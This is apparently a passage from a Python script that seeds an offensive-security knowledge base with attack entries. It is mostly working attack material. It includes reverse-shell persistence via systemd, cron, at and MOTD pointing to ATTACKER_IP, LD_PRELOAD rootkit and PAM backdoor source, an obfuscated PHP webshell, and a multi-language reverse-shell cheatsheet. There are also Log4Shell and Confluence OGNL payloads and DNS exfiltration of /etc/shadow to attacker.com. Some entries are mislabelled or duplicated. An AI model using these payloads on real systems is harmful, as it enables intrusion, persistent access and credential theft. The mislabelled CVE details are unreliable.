        seed.append(("exploit_pattern", "printer_spooler_exploit", {
            "name": "PrintNightmare (CVE-2021-34527)",
            "steps": [
                "1. Check if Spooler service is running: nmap -p445 --script=msrpc-enum target",
                "2. Test for vulnerability: python3 printnightmare.py --target target --share \\\\target\\IPC$ --user guest --password ''",
                "3. If vulnerable, add user or dump SAM: python3 printnightmare.py --target target --share \\\\target\\IPC$ --user admin --password P@ss --add-user pentest",
                "4. Connect: smbclient \\\\target\\IPC$ -U pentest",
                "5. Execute commands via psexec-style or WMI",
            ],
            "tools": ["printnightmare", "smbclient", "nmap"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))
        seed.append(("exploit_pattern", "smbghost_rce", {
            "name": "SMBGhost RCE (CVE-2020-0796)",
            "steps": [
                "1. Detect SMBv3 compression: nmap -p445 --script=smb-vuln-ms20-0796 target",
                "2. Confirm vulnerability with scanner script",
                "3. Exploit: python3 smbghost.py -ip target -p 4444",
                "4. Or use Metasploit: use exploit/windows/smb/ms20_0796_smbghost",
                "5. Catch reverse shell on listener",
            ],
            "tools": ["nmap", "msfconsole"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))
        seed.append(("exploit_pattern", "winrm_exec", {
            "name": "WinRM Remote Code Execution",
            "steps": [
                "1. Check WinRM ports: nmap -p5985,5986 --script=http-title target",
                "2. Test credentials: crackmapexec winrm target -u user -p pass",
                "3. Execute via evil-winrm: evil-winrm -i target -u user -p pass",
                "4. Or use Ruby: ruby -e 'require \"winrm\"; conn = WinRM::Connection.new(...)'",
                "5. Upload tools: upload /local/path /remote/path",
                "6. Establish persistent shell",
            ],
            "tools": ["evil-winrm", "crackmapexec", "nmap"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("exploit_pattern", "vnc_bypass", {
            "name": "VNC Authentication Bypass",
            "steps": [
                "1. Detect VNC: nmap -p5900-5910 --script=vnc-info target",
                "2. If no auth required, connect: vncviewer target::5900",
                "3. If weak auth, brute force: hydra -l '' -P /usr/share/wordlists/rockyou.txt vnc://target",
                "4. If Metasploit available: use auxiliary/scanner/vnc/vnc_none_auth",
                "5. Use autoroute + portfwd for pivoting through VNC session",
            ],
            "tools": ["nmap", "vncviewer", "hydra"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("exploit_pattern", "rce_via_file_upload", {
            "name": "Webshell via Unrestricted File Upload",
            "steps": [
                "1. Find upload endpoint: gobuster dir -u http://target -w common.txt -x php,jsp,aspx",
                "2. Test upload restrictions: try .php.jpg, .php5, .phtml, .phar",
                "3. Bypass client-side validation: intercept with Burp, modify Content-Type",
                "4. Upload webshell: <?php echo system($_GET['cmd']); ?>",
                "5. Access uploaded file: http://target/uploads/shell.php?cmd=id",
                "6. Upgrade to reverse shell: bash -i >& /dev/tcp/attacker/4444 0>&1",
            ],
            "tools": ["gobuster", "Burp Suite", "curl"],
            "requires_auth": True,
            "risk": "critical",
        }, "owasp"))

        # ══════════════════════════════════════════════════════
        # CONTAINER AND CLOUD ATTACKS (10)
        # ══════════════════════════════════════════════════════
        seed.append(("exploit_pattern", "docker_escape_volume", {
            "name": "Docker Container Escape via Volume Mount",
            "steps": [
                "1. Check mounted volumes: mount | grep -E '/var/run/docker.sock|/proc|/etc'",
                "2. If docker.sock mounted: docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host",
                "3. If /proc mounted: nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash",
                "4. If /etc mounted: write SSH key to /etc/ssh/authorized_keys",
            ],
            "tools": ["docker", "nsenter"],
            "requires_auth": True,
            "risk": "critical",
        }, "mitre"))
        seed.append(("exploit_pattern", "k8s_rce_via_dashboard", {
            "name": "Kubernetes Dashboard RCE",
            "steps": [
                "1. Access dashboard: https://target:8443",
                "2. If token available: create namespace, deploy privileged pod",
                "3. kubectl create namespace pwn --dry-run=client -o yaml | kubectl apply -f -",
                "4. Deploy privileged pod: spec.containers[0].securityContext.privileged=true",
                "5. Mount host filesystem via /host volume",
                "6. Chroot into host: chroot /host /bin/bash",
            ],
            "tools": ["kubectl", "curl"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))
        seed.append(("exploit_pattern", "aws_s3_bucket_abuse", {
            "name": "AWS S3 Bucket Enumeration and Abuse",
            "steps": [
                "1. Enumerate bucket names: bucket_finder.py -t company-names.txt",
                "2. Test public access: aws s3 ls s3://bucket-name --no-sign-request",
                "3. Download contents: aws s3 sync s3://bucket-name ./exfil --no-sign-request",
                "4. Check for credentials in files: grep -r 'AKIA' ./exfil",
                "5. If IAM role assumed: enumerate services, escalate privileges",
            ],
            "tools": ["aws-cli", "bucket_finder"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("exploit_pattern", "gcp_metadata_exploit", {
            "name": "GCP Metadata Service Exploitation",
            "steps": [
                "1. Check if metadata is reachable: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/",
                "2. Get service account token: curl -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "3. Use token for API calls: curl -H 'Authorization: Bearer TOKEN' https://compute.googleapis.com/compute/v1/projects/PROJECT/zones",
                "4. Enumerate disks, instances, networks",
            ],
            "tools": ["curl"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))
        seed.append(("exploit_pattern", "container_escape_procfs", {
            "name": "Container Escape via /proc Mount",
            "steps": [
                "1. Check /proc/self/ns/pid visibility: ls -la /proc/1/ns/",
                "2. If /proc is accessible: nsenter -t 1 -p -m -- /bin/bash",
                "3. If seccomp is not enforced: exploit kernel vulnerability",
                "4. Use CVE-2022-0185 (heap overflow) for escape",
                "5. Use PwnKit (CVE-2021-4034) if SUID binaries available",
            ],
            "tools": ["nsenter", "gcc"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))
        seed.append(("exploit_pattern", "supply_chain_poison", {
            "name": "Package Manager Supply Chain Attack",
            "steps": [
                "1. Identify package manager: npm, pip, gem, maven",
                "2. Check typosquatting: search for similar package names",
                "3. Look for packages with postinstall scripts",
                "4. Check if registry allows publishing without verification",
                "5. If access: publish malicious package with same name",
                "6. Monitor for downloads and callbacks",
            ],
            "tools": ["npm", "pip", "gem"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # IOT AND EMBEDDED ATTACKS (10)
        # ══════════════════════════════════════════════════════
        seed.append(("exploit_pattern", "camera_default_creds", {
            "name": "IP Camera Default Credential Attack",
            "steps": [
                "1. Identify camera: nmap -p80,554,8000,8080,37777 --script=http-title,target target",
                "2. Access RTSP stream: ffprobe rtsp://admin:admin@target:554/stream1",
                "3. Brute force RTSP: hydra -l admin -P /usr/share/wordlists/camera-defaults.txt rtsp://target",
                "4. Download firmware: wget http://target/firmware.bin",
                "5. Extract credentials: binwalk -e firmware.bin && grep -r 'password' _firmware.bin.extracted/",
            ],
            "tools": ["nmap", "ffprobe", "hydra", "binwalk"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("exploit_pattern", "router_config_leak", {
            "name": "Router Configuration File Leak",
            "steps": [
                "1. Check for backup download: http://target/backup.cfg, http://target:8080/cgi-bin/download",
                "2. Try TFTP: tftp target -c get config.bin",
                "3. Decode config: strings config.bin | grep -E 'password|key|token|secret'",
                "4. Use routerexploit for known models: routerexploit --target target --model model",
                "5. If admin panel found: default creds scan",
            ],
            "tools": ["nmap", "tftp", "strings", "routerexploit"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("exploit_pattern", "scada_plc_exploit", {
            "name": "SCADA/PLC Exploitation",
            "steps": [
                "1. Enumerate Modbus: nmap -p502 --script=modbus-discover target",
                "2. Read holding registers: mbtget -r 1 -n 10 target 502",
                "3. Enumerate BACnet: nmap -p47808 --script=bacnet-info target",
                "4. Check for S7comm: nmap -p102 --script=s7-info target",
                "5. If exposed: write arbitrary values to PLC registers",
                "6. Document all findings (DO NOT modify production systems)",
            ],
            "tools": ["nmap", "mbtget", "codesys"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))
        seed.append(("exploit_pattern", "smart_home_pivot", {
            "name": "Smart Home Hub Pivot",
            "steps": [
                "1. Identify hub: UPnP discovery, mDNS scan",
                "2. Check API endpoints: http://target:8080/api/, http://target/api/v1/",
                "3. Enumerate connected devices via API",
                "4. Check for MQTT exposure: nmap -p1883,8883 target",
                "5. Subscribe to MQTT topics: mosquitto_sub -t '#' -h target",
                "6. Replay commands for device control",
            ],
            "tools": ["nmap", "mosquitto_sub", "curl"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("exploit_pattern", "printer_firmware_mod", {
            "name": "Printer Firmware Modification",
            "steps": [
                "1. Download current firmware: wget http://target/firmware/update.bin",
                "2. Extract and analyze: binwalk -e update.bin",
                "3. Find writable filesystem in firmware",
                "4. Modify boot scripts or inject backdoor",
                "5. Rebuild and upload modified firmware",
                "6. Reboot printer to activate modified firmware",
            ],
            "tools": ["binwalk", "wget", "python"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))
        seed.append(("exploit_pattern", "nas_rce", {
            "name": "NAS Device Remote Code Execution",
            "steps": [
                "1. Identify NAS brand: nmap -p80,443,5000,8080,139,445 --script=http-title target",
                "2. Check for known vulns: Synology DSM, QNAP, Western Digital",
                "3. If vulnerable: use public exploit from exploit-db",
                "4. Example Synology: CVE-2022-27610 unauthenticated RCE",
                "5. Access admin panel: http://target:5000/webman/login.cgi",
                "6. Upload backdoor via admin interface",
            ],
            "tools": ["nmap", "msfconsole"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # ADVANCED PERSISTENCE (10)
        # ══════════════════════════════════════════════════════
        seed.append(("backdoor", "systemd_timer_backdoor", {
            "name": "Systemd Timer Persistence",
            "command": "cat > /etc/systemd/system/update-check.service << 'EOF'\n[Unit]\nDescription=System Update Check\n[Service]\nType=oneshot\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\nEOF\ncat > /etc/systemd/system/update-check.timer << 'EOF'\n[Unit]\nDescription=Daily Update Check\n[Timer]\nOnCalendar=daily\nPersistent=true\n[Install]\nWantedBy=timers.target\nEOF\nsystemctl enable --now update-check.timer",
            "tools": ["systemctl"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("backdoor", "openssh_backdoor_key", {
            "name": "SSH Backdoor via Authorized Keys",
            "command": "mkdir -p /root/.ssh && echo 'ssh-rsa AAAAAttackerPublicKey...' >> /root/.ssh/authorized_keys && chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys",
            "tools": ["ssh-keygen", "ssh"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("backdoor", "ld_preload_rootkit", {
            "name": "LD_PRELOAD Rootkit",
            "command": "cat > /tmp/rootkit.c << 'EOF'\n#define _GNU_SOURCE\n#include <dlfcn.h>\n#include <unistd.h>\n#include <string.h>\n#include <stdlib.h>\nint execve(const char *path, char *const argv[], char *const envp[]) {\n    if(strstr(argv[0],\"sshd\")) { execl(\"/bin/bash\",\"bash\",\"-c\",\"bash -i >& /dev/tcp/ATTACKER/4444 0>&1\",NULL); }\n    return ((int(*)(const char*,char *const*,char *const*))dlsym(RTLD_NEXT,\"execve\"))(path,argv,envp);\n}\nEOF\ngcc -shared -fPIC -o /usr/lib/liblog.so /tmp/rootkit.c -ldl && echo 'LD_PRELOAD=/usr/lib/liblog.so' >> /etc/environment",
            "tools": ["gcc", "ld"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))
        seed.append(("backdoor", "cron_reverse_shell", {
            "name": "Cron Reverse Shell",
            "command": "echo '*/5 * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\" 2>/dev/null' | crontab -",
            "tools": ["crontab"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("backdoor", "pam_skeleton_key", {
            "name": "PAM Backdoor (Skeleton Key)",
            "command": "cp /lib/x86_64-linux-gnu/security/pam_unix.so /lib/x86_64-linux-gnu/security/pam_unix.so.bak && cat > /tmp/pam_backdoor.c << 'EOF'\n#include <stdio.h>\n#include <string.h>\nint pam_sm_authenticate(int flags, int argc, const char **argv) {\n    const char *pass = getpwnam(getenv(\"USER\"))->pw_passwd;\n    if(strcmp(pass,\"backdoor\")==0) return 0;\n    return 1;\n}\nEOF\ngcc -shared -fPIC -o /lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_backdoor.c -lpam",
            "tools": ["gcc", "pam"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))
        seed.append(("backdoor", "at_job_persistence", {
            "name": "AT Job Persistence",
            "command": "echo \"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\" | at now + 1 minute && atq",
            "tools": ["at", "atq"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("backdoor", "xinetd_backdoor", {
            "name": "xinetd Backdoor Service",
            "command": "cat > /etc/xinetd.d/backdoor << 'EOF'\nservice backdoor\n{\n    disable = no\n    socket_type = stream\n    wait = no\n    user = root\n    server = /bin/bash\n    flags = REUSE\n}\nEOF\nxinetd",
            "tools": ["xinetd"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("backdoor", "motd_script", {
            "name": "MOTD Script Persistence",
            "command": "chmod +x /etc/update-motd.d/00-header && cat > /tmp/shell.sh << 'EOF'\n#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 2>/dev/null &\nEOF\nmv /tmp/shell.sh /etc/update-motd.d/00-header && chmod +x /etc/update-motd.d/00-header",
            "tools": ["bash"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("backdoor", "webshell隐蔽", {
            "name": "Obfuscated PHP Webshell",
            "command": "<?php $a=str_replace('x','','xaxsxx_xsxxtx');$b=$_REQUEST['c'];@$a('',@$b);?>",
            "tools": ["php"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # MORE CVE PATTERNS (15)
        # ══════════════════════════════════════════════════════
        seed.append(("cve_pattern", "cve_2023_44228", {
            "name": "Citrix Bleed (CVE-2023-4966)",
            "severity": "critical",
            "description": "Information disclosure in Citrix NetScaler ADC and Gateway allowing session token theft",
            "affected": ["Citrix ADC < 14.1-8.5", "Citrix Gateway < 14.1-8.5"],
            "exploit": "Use publicly available PoC to leak session cookies, hijack authenticated sessions",
            "cve": "CVE-2023-4966",
        }, "internal"))
        seed.append(("cve_pattern", "cve_2024_3094", {
            "name": "xz Utils Backdoor (CVE-2024-3094)",
            "severity": "critical",
            "description": "Malicious backdoor in xz/liblzma 5.6.0-5.6.1 allowing SSH auth bypass",
            "affected": ["xz-utils 5.6.0", "xz-utils 5.6.1", "liblzma 5.6.0-5.6.1"],
            "exploit": "Detect via: xz --version; strings /usr/lib/liblzma.so | grep 'H-Z'",
            "cve": "CVE-2024-3094",
        }, "internal"))
        seed.append(("cve_pattern", "cve_2023_46604", {
            "name": "Apache ActiveMQ RCE (CVE-2023-46604)",
            "severity": "critical",
            "description": "Remote code execution via ClassInfo deserialization in ActiveMQ OpenWire protocol",
            "affected": ["ActiveMQ 5.15.x < 5.15.16", "ActiveMQ 5.16.x < 5.16.7", "ActiveMQ 5.17.x < 5.17.6"],
            "exploit": "nmap -p61616 --script=activemq-info target; use public Java deserialization exploit",
            "cve": "CVE-2023-46604",
        }, "internal"))
        seed.append(("cve_pattern", "cve_2023_22527", {
            "name": "Atlassian Confluence RCE (CVE-2023-22527)",
            "severity": "critical",
            "description": "Template injection RCE in Confluence Server and Data Center",
            "affected": ["Confluence < 8.5.4"],
            "exploit": "Send OGNL injection payload via POST to /wiki/resolvers/titlesearch.action",
            "cve": "CVE-2023-22527",
        }, "internal"))
        seed.append(("cve_pattern", "cve_2022_40684", {
            "name": "FortiOS Authentication Bypass (CVE-2022-40684)",
            "severity": "critical",
            "description": "Path traversal in FortiOS allowing unauthenticated admin access",
            "affected": ["FortiOS 7.0.0-7.0.6", "FortiProxy 7.0.0-7.0.3"],
            "exploit": "curl -k -s 'https://target/api/v2/cmdb/system/admin/admin' -H 'Forwarded: for=\"[127.0.0.1]:8000\";by=\"[127.0.0.1]:9000\"'",
            "cve": "CVE-2022-40684",
        }, "internal"))
        seed.append(("cve_pattern", "cve_2022_26134", {
            "name": "Confluence OGNL Injection (CVE-2022-26134)",
            "severity": "critical",
            "description": "Unauthenticated OGNL injection RCE in Confluence Server",
            "affected": ["Confluence 1.3.0-7.18.1"],
            "exploit": "GET /%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%27utf-8%27%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%27X-Cmd-Response%27%2C%23a%29%29%7D/",
            "cve": "CVE-2022-26134",
        }, "internal"))
        seed.append(("cve_pattern", "cve_2021_44228", {
            "name": "Log4Shell (CVE-2021-44228)",
            "severity": "critical",
            "description": "JNDI injection in Apache Log4j allowing RCE",
            "affected": ["Log4j 2.0-beta9 to 2.14.1"],
            "exploit": "Send ${jndi:ldap://attacker.com/a} in user-agent, header, or parameter",
            "cve": "CVE-2021-44228",
        }, "internal"))
        seed.append(("cve_pattern", "cve_2021_34527", {
            "name": "PrintNightmare (CVE-2021-34527)",
            "severity": "critical",
            "description": "Windows Print Spooler RCE allowing domain-wide compromise",
            "affected": ["Windows Server 2019", "Windows 10", "Windows Server 2016"],
            "exploit": "Use public PrintNightmare exploit or Metasploit module for LPE/RCE",
            "cve": "CVE-2021-34527",
        }, "internal"))
        seed.append(("cve_pattern", "cve_2021_26855", {
            "name": "ProxyLogon (CVE-2021-26855)",
            "severity": "critical",
            "description": "SSRF in Microsoft Exchange Server leading to RCE",
            "affected": ["Exchange Server 2013", "Exchange Server 2016", "Exchange Server 2019"],
            "exploit": "Chain with CVE-2021-27065 for file write and webshell deployment",
            "cve": "CVE-2021-26855",
        }, "internal"))
        seed.append(("cve_pattern", "cve_2020_1472", {
            "name": "Zerologon (CVE-2020-1472)",
            "severity": "critical",
            "description": "Netlogon privilege escalation allowing domain controller compromise",
            "affected": ["Windows Server 2008-2019"],
            "exploit": "Set machine account password to empty via MS-NRPC: python zerologon_tester.py DC_NAME DC_IP",
            "cve": "CVE-2020-1472",
        }, "internal"))
        seed.append(("cve_pattern", "cve_2020_0787", {
            "name": "Windows BITS EoP (CVE-2020-0787)",
            "severity": "high",
            "description": "Arbitrary file move in BITS allowing privilege escalation",
            "affected": ["Windows 7-10", "Windows Server 2008-2019"],
            "exploit": "Use BITS to create symbolic link and move files to arbitrary locations",
            "cve": "CVE-2020-0787",
        }, "internal"))
        seed.append(("cve_pattern", "cve_2019_0708", {
            "name": "BlueKeep (CVE-2019-0708)",
            "severity": "critical",
            "description": "RDP RCE in Windows Remote Desktop Services (wormable)",
            "affected": ["Windows 7", "Windows Server 2008"],
            "exploit": "Metasploit: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
            "cve": "CVE-2019-0708",
        }, "internal"))
        seed.append(("cve_pattern", "cve_2023_4966", {
            "name": "Citrix Bleed CVE-2023-4966",
            "severity": "critical",
            "description": "Buffer overflow in Citrix NetScaler leaking session tokens",
            "affected": ["NetScaler ADC/Gateway < 14.1-8.5", "< 13.1-49.15"],
            "exploit": "Use CVE-2023-4966 PoC to leak session cookies, replay for admin access",
            "cve": "CVE-2023-4966",
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # ADVANCED POST-EXPLOITATION (10)
        # ══════════════════════════════════════════════════════
        seed.append(("post_exploit", "credential_dump_windows", {
            "name": "Windows Credential Dumping",
            "steps": [
                "1. reg save HKLM\\SAM C:\\temp\\SAM.bak",
                "2. reg save HKLM\\SYSTEM C:\\temp\\SYSTEM.bak",
                "3. reg save HKLM\\SECURITY C:\\temp\\SECURITY.bak",
                "4. python3 secretsdump.py -sam SAM.bak -system SYSTEM.bak -security SECURITY.bak LOCAL",
                "5. Crack NTLM hashes with hashcat -m 1000",
            ],
            "tools": ["reg", "secretsdump.py", "hashcat"],
            "requires_auth": True,
            "risk": "high",
        }, "mitre"))
        seed.append(("post_exploit", "token_impersonation", {
            "name": "Windows Token Impersonation",
            "steps": [
                "1. whoami /priv  # Check for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege",
                "2. Use PrintSpoofer: PrintSpoofer.exe -i -c cmd.exe",
                "3. Use GodPotato: GodPotato.exe -cmd cmd.exe",
                "4. Or JuicyPotato: JuicyPotato.exe -l 1337 -p cmd.exe -t *",
                "5. Get SYSTEM shell via impersonated token",
            ],
            "tools": ["PrintSpoofer", "GodPotato", "JuicyPotato"],
            "requires_auth": True,
            "risk": "high",
        }, "mitre"))
        seed.append(("post_exploit", "password_spray_ad", {
            "name": "Active Directory Password Spray",
            "steps": [
                "1. Enumerate users: enum4linux -U target | grep 'User:'",
                "2. Get user list: ldapsearch -x -H target -b 'dc=domain,dc=com' '(objectClass=user)' sAMAccountName",
                "3. Spray common passwords: crackmapexec smb target -u users.txt -p 'Password1!' --continue-on-success",
                "4. Try: Password1, Welcome1, Summer2024!, Company1!, etc.",
                "5. Lockout-aware: spray 1 password per 30 min across all users",
            ],
            "tools": ["crackmapexec", "ldapsearch", "enum4linux"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("post_exploit", "lateral_movement_wmi", {
            "name": "WMI Lateral Movement",
            "steps": [
                "1. wmic /node:TARGET /user:admin /password:pass process call create 'cmd.exe /c whoami > C:\\temp\\out.txt'",
                "2. Or use impacket: wmiexec.py domain/admin:pass@target",
                "3. Upload tools: putty.exe to C:\\Windows\\Temp\\",
                "4. Establish persistent shell via scheduled task",
            ],
            "tools": ["wmic", "wmiexec.py"],
            "requires_auth": True,
            "risk": "high",
        }, "mitre"))
        seed.append(("post_exploit", "data_exfil_dns", {
            "name": "Data Exfiltration via DNS",
            "steps": [
                "1. Encode data: base64 -w0 /etc/shadow | fold -w50",
                "2. Split into chunks and exfil via DNS queries",
                "3. Use DNSExfiltrator: python dnsexfiltrator.py -d attacker.com -f /etc/shadow",
                "4. Or use iodine for DNS tunneling: iodined -f tunnel.attacker.com 10.0.0.1",
                "5. Monitor on attacker side: tcpdump -i eth0 port 53",
            ],
            "tools": ["DNSExfiltrator", "iodine", "tcpdump"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))
        seed.append(("post_exploit", "reverse_shell_variants", {
            "name": "Reverse Shell Cheatsheet",
            "payloads": [
                "bash: bash -i >& /dev/tcp/IP/PORT 0>&1",
                "python: python -c 'import socket,subprocess,os; s=socket.socket(); s.connect((\"IP\",PORT)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/sh\",\"-i\"])'",
                "perl: perl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\")}'",
                "nc: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP PORT >/tmp/f",
                "php: php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\")'",
                "ruby: ruby -rsocket -e'f=TCPSocket.open(\"IP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                "lua: lua -e \"require('socket');require('os');t=socket.tcp();t:connect('IP','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
            ],
            "tools": ["bash", "python", "perl", "nc"],
            "requires_auth": True,
            "risk": "critical",
        }, "internal"))
        seed.append(("post_exploit", "linux_privesc_checklist", {
            "name": "Linux Privilege Escalation Checklist",
            "steps": [
                "1. uname -a; cat /etc/os-release",
                "2. sudo -l",
                "3. find / -perm -4000 -type f 2>/dev/null  # SUID binaries",
                "4. find / -writable -type f 2>/dev/null | head -20",
                "5. cat /etc/crontab; ls -la /etc/cron*",
                "6. ss -tlnp; netstat -tlnp",
                "7. docker ps; docker images",
                "8. cat /etc/passwd | grep -v nologin",
                "9. env; cat /proc/self/environ",
                "10. id; groups",
            ],
            "tools": ["linuxprivchecker", "linpeas.sh"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # ADVANCED WIFI AND BLUETOOTH (8)
        # ══════════════════════════════════════════════════════
        seed.append(("wifi_attack", "wpa3_sae_downgrade", {
            "name": "WPA3 to WPA2 Downgrade Attack",
            "steps": [
                "1. Capture SAE commit/confirm exchange",
                "2. Force client to connect to rogue AP with WPA2 only",
                "3. Capture 4-way handshake from WPA2 connection",
                "4. Crack captured WPA2 handshake with hashcat -m 22000",
            ],
            "tools": ["hostapd", "aircrack-ng", "hashcat"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("wifi_attack", "karma_mana_attack", {
            "name": "Karma/MANA Attack",
            "steps": [
                "1. Set up rogue AP broadcasting victim's known SSIDs",
                "2. Send deauth to real AP: aireplay-ng --deauth 10 -a real_bssid wlan0mon",
                "3. Clients auto-connect to stronger signal (rogue AP)",
                "4. Capture all traffic through rogue AP",
                "5. Harvest credentials from unencrypted HTTP",
                "6. Perform SSL stripping for HTTPS",
            ],
            "tools": ["hostapd-mana", "aireplay-ng", "sslstrip"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("wifi_attack", "pmkid_attack", {
            "name": "PMKID Clientless Attack",
            "steps": [
                "1. Capture PMKID directly from AP: hcxdumptool -i wlan0mon -o capture.pcapng --filterlist_ap=targets.txt --filtermode=2",
                "2. Convert to hashcat format: hcxpcapngtool -o hash.hc22000 capture.pcapng",
                "3. Crack: hashcat -m 22000 hash.hc22000 wordlist.txt",
                "4. No client association required - works against any WPA2 AP",
            ],
            "tools": ["hcxdumptool", "hcxpcapngtool", "hashcat"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("wifi_attack", "bt_sdr_sniff", {
            "name": "Bluetooth Low Energy Sniffing",
            "steps": [
                "1. Scan BLE: hcitool lescan",
                "2. Capture BLE traffic: btmon -w ble_capture.log",
                "3. Use Ubertooth: ubertooth-btle -f -c channel",
                "4. Decode BLE packets: wireshark -r ble_capture.pcap",
                "5. Identify services and characteristics",
                "6. Replay captured packets for replay attacks",
            ],
            "tools": ["hcitool", "btmon", "ubertooth"],
            "requires_auth": True,
            "risk": "medium",
        }, "internal"))
        seed.append(("wifi_attack", "rogue_dhcp", {
            "name": "Rogue DHCP Server Attack",
            "steps": [
                "1. Set up rogue DHCP: dnsmasq --interface=eth0 --dhcp-range=10.0.0.100,10.0.0.200,255.255.255.0,12h --dhcp-option=3,10.0.0.1 --dhcp-option=6,10.0.0.1",
                "2. Clients get rogue DNS pointing to attacker",
                "3. Intercept all DNS queries",
                "4. Redirect to phishing pages or capture credentials",
            ],
            "tools": ["dnsmasq"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("wifi_attack", "evil_portal", {
            "name": "Evil Portal with Captive Portal",
            "steps": [
                "1. Set up hostapd with WPA2",
                "2. Configure dnsmasq for captive portal redirect",
                "3. Serve phishing page on all HTTP requests",
                "4. Capture WiFi password or credentials",
                "5. Use Wifiphisher for automated phishing",
            ],
            "tools": ["hostapd", "dnsmasq", "Wifiphisher"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))

        # ══════════════════════════════════════════════════════
        # MITM AND NETWORK ATTACKS (8)
        # ══════════════════════════════════════════════════════
        seed.append(("exploit_pattern", "arp_spoof_mitm", {
            "name": "ARP Spoofing Man-in-the-Middle",
            "steps": [
                "1. Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward",
                "2. Start ARP spoofing: arpspoof -i eth0 -t TARGET GATEWAY",
                "3. Capture traffic: tcpdump -i eth0 -w capture.pcap",
                "4. Use mitmproxy for HTTPS interception",
                "5. Harvest credentials: urlsnarf, dsniff",
            ],
            "tools": ["arpspoof", "mitmproxy", "dsniff", "tcpdump"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("exploit_pattern", "dns_spoof", {
            "name": "DNS Spoofing Attack",
            "steps": [
                "1. Set up DNS server with spoofed records: dnsmasq --address=/#/10.0.0.1",
                "2. Combine with ARP spoofing to redirect DNS queries",
                "3. Or poison DNS cache directly: dnschef --fakeip 10.0.0.1 --fakedomains google.com",
                "4. Serve malicious content on spoofed domain",
            ],
            "tools": ["dnsmasq", "dnschef", "ettercap"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("exploit_pattern", "llmnr_poisoning", {
            "name": "LLMNR/mDNS/NBT-NS Poisoning",
            "steps": [
                "1. Start Responder: responder -I eth0 -wrf",
                "2. Wait for name resolution requests or force with wmic /target",
                "3. Capture NTLMv2 hashes from responding hosts",
                "4. Crack with hashcat -m 5600",
                "5. Or relay with ntlmrelayx for direct access",
            ],
            "tools": ["Responder", "hashcat", "ntlmrelayx"],
            "requires_auth": True,
            "risk": "high",
        }, "internal"))
        seed.append(("exploit_pattern", "ssl_strip", {
            "name": "SSL Strip Downgrade Attack",
            "steps": [
                "1. Enable IP forwarding",
                "2. ARP spoof target",
                "3. Start sslstrip: sslstrip -l 8080",
